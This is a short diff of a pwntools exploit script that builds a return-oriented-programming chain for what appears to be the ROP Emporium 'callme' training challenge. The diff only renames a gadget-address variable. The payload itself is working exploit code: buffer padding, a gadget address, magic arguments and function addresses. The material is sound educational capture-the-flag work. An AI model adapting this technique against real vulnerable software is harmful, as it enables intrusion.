@@ -3,7 +3,7 @@
 from pwn import *
 
 padding = b"A" * 40
-usefulGadgets = p64(0x40093c)
+usefulGadgets_addr = p64(0x40093c)
 arg1 = p64(0xdeadbeefdeadbeef)
 arg2 = p64(0xcafebabecafebabe)
 arg3 = p64(0xd00df00dd00df00d)
@@ -13,17 +13,17 @@ callme_three_addr = p64(0x4006f0)
 
 payload = (
     padding +
-    usefulGadgets +
+    usefulGadgets_addr +
     arg1 +
     arg2 +
     arg3 +
     callme_one_addr +
-    usefulGadgets +
+    usefulGadgets_addr +
     arg1 +
     arg2 +
     arg3 +
     callme_two_addr +
-    usefulGadgets +
+    usefulGadgets_addr +
     arg1 +
     arg2 +
     arg3 +
